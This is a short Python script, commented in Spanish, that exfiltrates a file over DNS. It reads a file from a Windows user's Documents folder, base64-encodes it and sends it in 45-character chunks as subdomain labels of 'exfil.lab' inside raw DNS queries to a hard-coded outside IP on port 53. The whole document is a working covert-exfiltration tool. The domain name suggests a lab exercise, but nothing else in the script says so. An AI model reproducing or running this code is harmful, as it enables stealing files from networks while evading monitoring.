import socket
import base64
import os

# ---------------- CONFIGURACIÓN ----------------
SERVER_IP = "31.97.185.189"            
SERVER_PORT = 53                        
FILENAME = r"C:\Users\T0279742\Documents\hello.ps1" 
CHUNK_SIZE = 45                         
SUFIJO_DOMINIO = "exfil.lab"
# ----------------------------------------------

def chunk_data(data, size):
    """Divide una cadena en trozos de tamaño fijo"""
    return [data[i:i + size] for i in range(0, len(data), size)]

def build_dns_query(domain):
    """Construye una consulta DNS tipo A válida"""
    ID = b'\x12\x34'
    FLAGS = b'\x01\x00'  
    QDCOUNT = b'\x00\x01'
    header = ID + FLAGS + QDCOUNT + b'\x00\x00' * 3 

    qname = b''.join(len(p).to_bytes(1, 'big') + p.encode() for p in domain.split('.')) + b'\x00'
    QTYPE = b'\x00\x01'   
    QCLASS = b'\x00\x01'  
    return header + qname + QTYPE + QCLASS

def enviar_archivo():
    if not os.path.exists(FILENAME):
        print(f"[X] Archivo no encontrado: {FILENAME}")
        return

    with open(FILENAME, "rb") as f:
        raw_data = f.read()

    print(f"[*] Tamaño del archivo: {len(raw_data)} bytes")

    # Codificamos en base64 URL-safe 
    encoded = base64.urlsafe_b64encode(raw_data).decode().rstrip("=")
    print(f"[*] Longitud total codificada: {len(encoded)} caracteres")

    # Dividimos en chunks
    chunks = chunk_data(encoded, CHUNK_SIZE)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    enviados = 0
    for i, chunk in enumerate(chunks):
        domain = f"{chunk}.{i}.{SUFIJO_DOMINIO}"

        # Validar longitud de etiquetas DNS
        if any(len(label) > 63 for label in domain.split(".")):
            print(f"[!] Chunk {i} demasiado largo, ignorado.")
            continue

        query = build_dns_query(domain)
        try:
            sock.sendto(query, (SERVER_IP, SERVER_PORT))
            print(f"[+] Enviado chunk {i}: {domain}")
            enviados += 1
        except Exception as e:
            print(f"[!] Error al enviar chunk {i}: {e}")

   
    fin_query = build_dns_query(f"fin.{SUFIJO_DOMINIO}")
    sock.sendto(fin_query, (SERVER_IP, SERVER_PORT))
    print(f"[✓] Envío finalizado. Total de chunks enviados: {enviados}")
    sock.close()

if __name__ == "__main__":
    enviar_archivo()
